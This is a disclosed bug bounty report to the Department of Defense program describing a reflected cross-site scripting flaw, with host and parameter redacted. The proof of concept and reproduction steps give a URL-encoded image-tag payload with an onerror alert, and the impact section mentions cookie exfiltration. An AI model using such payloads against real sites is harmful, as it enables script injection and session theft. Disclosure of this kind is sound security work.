# Reflected XSS at https://█████████ via "███" parameter

## Report Details
- **Report ID**: 1457277
- **URL**: https://hackerone.com/reports/1457277
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-01-21T12:16:34.245Z
- **Disclosed**: 2022-02-14T21:22:15.328Z

## Reporter
- **Username**: pelegn
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**

There is Reflected Cross site scripting issue at the following url:

https://█████████

## Proof Of Concept

https://███████?████████=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E

█████

Best Regards

@pelegn

## Impact

Cookies Exfiltration
SOAP Bypass
CORS Bypass
Executing javascript on the victim behalf

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Navigate to https://█████?████████=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
